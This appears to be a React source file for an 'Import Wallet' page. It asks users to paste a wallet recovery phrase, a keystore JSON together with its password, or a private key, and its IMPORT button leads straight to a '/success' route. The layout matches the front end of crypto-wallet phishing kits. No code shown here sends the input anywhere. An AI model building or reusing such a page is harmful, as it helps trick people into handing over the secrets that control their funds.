import React, { useState } from "react";
import { Link } from "react-router-dom";
import PageLayout from "../PageLayout/PageLayout";

const DetailsPage = () => {
  const [tab, setTab] = useState(1);

  return (
    <PageLayout>
      <div className="hero">
        <h3>Import Wallet</h3>
      </div>

      <div className="input-box-container">
        <div className="tab-container">
          <div
            onClick={() => setTab(1)}
            className={tab === 1 ? "active-tab" : "tab"}
          >
            <h6>Phrase</h6>
          </div>
          <div
            onClick={() => setTab(2)}
            className={tab === 2 ? "active-tab" : "tab"}
          >
            <h6> Keystore JSON</h6>
          </div>
          <div
            onClick={() => setTab(3)}
            className={tab === 3 ? "active-tab" : "tab"}
          >
            <h6>Private Key</h6>
          </div>
        </div>

        <div className="input-box">
          <p className="black-text">
            {tab === 2
              ? " Seperate your Keystore JSON from Your Passsword with - or /"
              : ""}
          </p>
          <textarea
            className="input"
            placeholder={tab === 3 ? "Private Key" : ""}
          />
          <p className="blue-text">
            {tab === 1
              ? "Typically 12 (sometimes 24) words separated by single spaces"
              : tab === 2
              ? "Several lines of text beginning with '(...)' plus the password you used to encrypt it."
              : "Typically 64 alphanumeric characters"}
          </p>
          <button type="submit">
            <Link to="/success" style={{ textDecoration: "none", color: "white" }}>
              IMPORT
            </Link>
          </button>
        </div>
      </div>
    </PageLayout>
  );
};

export default DetailsPage;
